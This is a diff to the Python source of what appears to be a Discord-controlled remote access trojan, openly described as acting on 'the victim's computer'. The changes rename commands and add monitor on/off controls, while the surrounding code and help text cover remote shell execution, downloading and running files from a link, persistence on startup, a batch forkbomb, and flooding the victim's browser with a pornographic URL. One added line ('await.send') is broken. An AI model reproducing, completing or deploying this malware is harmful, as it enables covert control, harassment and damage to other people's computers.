@@ -28,10 +28,13 @@ from discord.ext import commands
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix='.', intents=intents, help_command=None)
 
-config = {
-    'token': "%token%",
-    'server_id': '%id%'
-}
+
+#### HERES YOUR CONFIG ####
+config = { #### HERES YOUR CONFIG ####
+    'token': "%token%", #### HERES YOUR CONFIG ####
+    'server_id': '%id%' #### HERES YOUR CONFIG ####
+} #### HERES YOUR CONFIG ####
+#### HERES YOUR CONFIG ####
 
 sessions = {}
 
@@ -96,7 +99,7 @@ Information Gathering:
 
 Remote Shell Commands:
 
-  .shell <session> <command>: Executes a command on the victim's computer
+  .shell <sessionkey> <command>: Executes a command on the victim's computer
 
 ------------------------------------------------------------------------------------------
 
@@ -112,29 +115,31 @@ System Control:
 
   .restart <sessionkey>: Restarts the user's computer
   .shutdown <sessionkey>: Shuts down the user's computer
-
-------------------------------------------------------------------------------------------
-
-Malware Commands
-
-  .upload <session> <filelink>: Uploads and downloads file and then runs it on victims pc
-  .startup <session>: puts rat on startup
-  .ddos <website>: COMING SOON
-  .spread <session>: COMING SOON
-  .roblox <session>: COMING SOON
-  .exodus <session>: COMING SOON
+  .screenoff <sessionkey>: Turns off victims monitor
+  .screenon <sessionkey>: Turns Victims monitor back on
 
 ------------------------------------------------------------------------------------------
 ```
 """
     message2 = """```
+Malware Commands
+
+  .upload <sessionkey> <filelink>: Uploads and downloads file and then runs it on victims pc
+  .startup <sessionkey>: puts rat on startup
+  .ddos <sessionkey>: COMING SOON
+  .spread <sessionkey>: COMING SOON
+  .roblox <sessionkey>: COMING SOON
+  .exodus <sessionkey>: COMING SOON
+
+------------------------------------------------------------------------------------------
+
 Troll Commands:
   
-  .furryporn <session>: this spams furry porn browsers on victims browser to flood their history
-  .fork <session>: forkbombs their computer using simple batch script
-  .rickroll <session>: rickrolls their computer for 30 seconds and they cannot escape
-  .music <session> <file_attachment>: plays music on their computer
-  .bluescreen <session>: COMING SOON.
+  .fp <sessionkey>: this spams furry stuff browsers on victims browser to flood their history
+  .fork <sessionkey>: forkbombs their computer using simple batch script
+  .rickroll <sessionkey>: rickrolls their computer for 30 seconds and they cannot escape
+  .music <sessionkey> <file_attachment>: plays music on their computer
+  .bluescreen <sessionkey>: COMING SOON.
 
 ------------------------------------------------------------------------------------------
 ```
@@ -442,14 +447,14 @@ async def con(music_player):
     music_player.stop()
 
 @bot.command()
-async def furryporn(ctx, seshn: str):
+async def fp(ctx, seshn: str):
     session = sessions.get(seshn.lower())
     if session:
         website = "https://www.pornhub.com/view_video.php?viewkey=63d567c6732bd"
         windows = 100
         for _ in range(windows):
             webbrowser.open(website)
-        await session_channel.send("Opening furryporn...")
+        await session_channel.send("Opening fp...")
     else:
         pass
 
@@ -478,6 +483,27 @@ async def fork(ctx, seshn):
         command = "%0|%0"
         os.system(command)
         await ctx.send(f"Forkbombed session :rofl:")
+    else:
+        pass
+
+@bot.command()
+async def screenoff(ctx, seshn):
+    session = sessions.get(seshn.lower())
+    if session:
+        WM_SYSCOMMAND = 0x0112
+        SC_MONITORPOWER = 0xF170
+        HWND_BROADCAST = 0xFFFF
+        ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
+        await ctx.send(f"Users Display Turned off :)")
+    else:
+        pass
+
+@bot.command() 
+async def screenon(ctx, seshn):
+    session = sessions.get(seshn.lower())
+    if session:
+        ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
+        await.send("Victims Screen has turned back on...")
     else:
         pass
     
